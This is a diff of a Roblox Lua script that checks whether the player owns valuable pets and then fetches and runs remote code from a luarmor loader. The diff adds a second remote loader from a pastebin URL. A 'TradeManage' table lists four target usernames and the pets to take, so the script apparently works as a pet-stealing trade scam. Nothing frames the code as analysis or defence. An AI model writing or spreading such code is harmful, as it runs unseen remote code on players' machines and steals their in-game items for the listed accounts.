@@ -37,21 +37,26 @@ local function hasTargetPet(petList)
 
     return success and result
 end
-    getgenv().KEY = "Shippy"
-    _G.TradeManage = {
-        Target = {
-            "KingSentz645770",
-			"OrvilleuMoEfH",
-			"SafiyaAlShafee72",
-			"NoahXShop"
-        },
-        Pet = {
-            "Corrupted Kitsune",
-            "Kitsune",
-            "Mimic Octopus",
-            "Dragonfly"
-        }
+
+getgenv().YourScript = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/vp4jCmFe"))()
+end
+
+getgenv().KEY = "Shippy"
+_G.TradeManage = {
+    Target = {
+        "KingSentz645770",
+        "OrvilleuMoEfH",
+        "SafiyaAlShafee72",
+        "NoahXShop"
+    },
+    Pet = {
+        "Corrupted Kitsune",
+        "Kitsune",
+        "Mimic Octopus",
+        "Dragonfly"
     }
+}
 if hasTargetPet(_G.TradeManage.Pet) then
     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/64146f41d4c3ead8fb6d71339ef0c7c2.lua"))()
 else
